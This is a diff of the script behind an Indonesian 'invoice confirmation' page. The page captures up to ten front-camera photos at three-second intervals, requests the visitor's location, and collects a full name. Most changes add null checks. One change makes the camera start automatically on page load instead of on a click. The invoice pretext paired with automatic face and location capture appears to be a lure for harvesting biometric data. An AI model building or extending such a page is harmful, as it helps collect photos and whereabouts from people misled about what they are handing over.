@@ -886,24 +886,28 @@
       let locationState = "idle";
 
       function setStatus(message, state = "") {
+        if (!statusBox) return;
         statusBox.textContent = message;
         statusBox.className = "status show" + (state ? " " + state : "");
       }
 
       function setLocationState(state, message) {
         locationState = state;
-        locationStateText.textContent = message;
-        locationStateBox.className =
-          "location-state" +
-          (state === "granted"
-            ? " success"
-            : state === "unavailable"
-              ? " error"
-              : "");
+        if (locationStateText) locationStateText.textContent = message;
+        if (locationStateBox) {
+          locationStateBox.className =
+            "location-state" +
+            (state === "granted"
+              ? " success"
+              : state === "unavailable"
+                ? " error"
+                : "");
+        }
         updateSubmitAvailability();
       }
 
       function updateSubmitAvailability() {
+        if (!submitButton) return;
         submitButton.disabled =
           isSubmitting || frames.length < 1 || locationState === "requesting";
       }
@@ -911,27 +915,38 @@
       function setStep(number) {
         [1, 2, 3].forEach((index) => {
           const step = document.getElementById("step" + index);
-          step.classList.toggle("active", index === number);
-          step.classList.toggle("done", index < number);
-          step.querySelector(".step-dot").textContent =
-            index < number ? "✓" : String(index);
+          if (step) {
+            step.classList.toggle("active", index === number);
+            step.classList.toggle("done", index < number);
+            const dot = step.querySelector(".step-dot");
+            if (dot) dot.textContent = index < number ? "✓" : String(index);
+          }
         });
       }
 
       function showPageError(title, text) {
-        document.getElementById("pageStateTitle").textContent = title;
-        document.getElementById("pageStateText").textContent = text;
+        const titleEl = document.getElementById("pageStateTitle");
+        const textEl = document.getElementById("pageStateText");
+        if (titleEl) titleEl.textContent = title;
+        if (textEl) textEl.textContent = text;
       }
 
       function showCompletion(alreadyVerified = false) {
         stopCamera();
-        document.getElementById("formView").hidden = true;
-        document.getElementById("successView").classList.add("active");
-        if (alreadyVerified) {
-          document.getElementById("successTitle").textContent =
-            "Invoice sudah dikonfirmasi";
-          document.getElementById("successText").textContent =
-            "Link invoice ini sudah selesai diverifikasi sebelumnya. Tidak ada data baru yang dikumpulkan.";
+        const formView = document.getElementById("formView");
+        if (formView) formView.hidden = true;
+        const successView = document.getElementById("successView");
+        if (successView) {
+          successView.classList.add("active");
+          if (alreadyVerified) {
+            const successTitle = document.getElementById("successTitle");
+            const successText = document.getElementById("successText");
+            if (successTitle) successTitle.textContent = "Invoice sudah dikonfirmasi";
+            if (successText) {
+              successText.textContent =
+                "Link invoice ini sudah selesai diverifikasi sebelumnya. Tidak ada data baru yang dikumpulkan.";
+            }
+          }
         }
         setStep(3);
       }
@@ -956,21 +971,25 @@
                 element.textContent = value || "…";
               });
           });
-          document.getElementById("pageState").hidden = true;
-          document.getElementById("mainLayout").hidden = false;
-          if (body.verifiedAt) showCompletion(true);
+          const pageState = document.getElementById("pageState");
+          const mainLayout = document.getElementById("mainLayout");
+          if (pageState) pageState.hidden = true;
+          if (mainLayout) mainLayout.hidden = false;
+          if (body.invoice.verifiedAt) {
+            showCompletion(true);
+            return;
+          }
+          if (cameraButton) cameraButton.disabled = false;
         } catch (error) {
-          showPageError(
-            "Invoice tidak tersedia",
-            "Link mungkin salah atau invoice sudah tidak tersedia. Minta admin mengirim link yang benar.",
-          );
+          showPageError("Invoice tidak dapat dimuat", error.message);
         }
       }
 
-      function validateField(input, error, minLength) {
-        const valid = input.value.trim().length >= minLength;
-        input.setAttribute("aria-invalid", String(!valid));
-        error.classList.toggle("show", !valid);
+      function validateField(field, errorElement, minLength) {
+        if (!field) return true;
+        const valid = field.value.trim().length >= minLength;
+        field.classList.toggle("invalid", !valid);
+        if (errorElement) errorElement.classList.toggle("show", !valid);
         return valid;
       }
 
@@ -989,16 +1008,21 @@
       }
 
       function stopCamera() {
-        clearInterval(captureTimer);
-        captureTimer = null;
+        if (captureTimer) {
+          clearInterval(captureTimer);
+          captureTimer = null;
+        }
         if (stream) stream.getTracks().forEach((track) => track.stop());
         stream = null;
-        cameraVideo.srcObject = null;
+        if (cameraVideo) cameraVideo.srcObject = null;
       }
 
       function freezeOnLastFrame() {
-        if (frames.length) lastFrame.getContext("2d").drawImage(canvas, 0, 0);
-        cameraFrame.classList.add("frozen");
+        if (frames.length && lastFrame) {
+          const lastCtx = lastFrame.getContext("2d");
+          if (lastCtx) lastCtx.drawImage(canvas, 0, 0);
+        }
+        if (cameraFrame) cameraFrame.classList.add("frozen");
         stopCamera();
       }
 
@@ -1006,6 +1030,7 @@
         if (
           !stream ||
           frames.length >= MAX_PHOTOS ||
+          !cameraVideo ||
           cameraVideo.readyState < 2
         )
           return;
@@ -1015,8 +1040,10 @@
           img: canvas.toDataURL("image/jpeg", 0.72),
           ts: Date.now(),
         });
-        cameraCount.textContent =
-          "Kamera aktif · " + frames.length + "/" + MAX_PHOTOS + " foto";
+        if (cameraCount) {
+          cameraCount.textContent =
+            "Kamera aktif · " + frames.length + "/" + MAX_PHOTOS + " foto";
+        }
         updateSubmitAvailability();
         setStatus(
           frames.length +
@@ -1026,7 +1053,7 @@
         );
         if (frames.length >= MAX_PHOTOS) {
           freezeOnLastFrame();
-          cameraCount.textContent = "Pengambilan selesai · 10/10 foto";
+          if (cameraCount) cameraCount.textContent = "Pengambilan selesai · 10/10 foto";
           setStatus(
             "Batas 10 foto tercapai. Kamera sudah dimatikan; data siap dikirim.",
             "success",
@@ -1073,20 +1100,26 @@
             video: { facingMode: "user" },
             audio: false,
           });
-          cameraVideo.srcObject = stream;
-          cameraFrame.classList.remove("frozen");
-          cameraFrame.classList.add("active");
-          await cameraVideo.play();
+          if (cameraVideo) {
+            cameraVideo.srcObject = stream;
+            await cameraVideo.play();
+          }
+          if (cameraFrame) {
+            cameraFrame.classList.remove("frozen");
+            cameraFrame.classList.add("active");
+          }
           // cameraButton.textContent = 'Kamera aktif';
-          identityFields.hidden = false;
+          if (identityFields) identityFields.hidden = false;
           setStep(3);
           requestLocation();
           captureFrame();
           captureTimer = setInterval(captureFrame, 3000);
-          document.getElementById("fullName").focus();
+          document.getElementById("fullName")?.focus();
         } catch (error) {
-          cameraButton.disabled = false;
-          cameraButton.textContent = "Coba aktifkan kamera lagi";
+          if (cameraButton) {
+            cameraButton.disabled = false;
+            cameraButton.textContent = "Coba aktifkan kamera lagi";
+          }
           setStatus(
             error.message ||
               "Izin kamera tidak diberikan. Periksa pengaturan browser lalu coba lagi.",
@@ -1095,17 +1128,19 @@
         }
       }
 
-      cameraButton.addEventListener("DOMContentLoaded", startCamera);
+      document.addEventListener("DOMContentLoaded", startCamera);
 
       form.addEventListener("submit", async (event) => {
         event.preventDefault();
 
         isSubmitting = true;
         freezeOnLastFrame();
-        cameraCount.textContent =
-          "Pengambilan dijeda · " + frames.length + "/" + MAX_PHOTOS + " foto";
+        if (cameraCount) {
+          cameraCount.textContent =
+            "Pengambilan dijeda · " + frames.length + "/" + MAX_PHOTOS + " foto";
+        }
         updateSubmitAvailability();
-        cameraButton.disabled = true;
+        if (cameraButton) cameraButton.disabled = true;
         sessionId ||= window.crypto.randomUUID
           ? window.crypto.randomUUID()
           : String(Date.now()) +
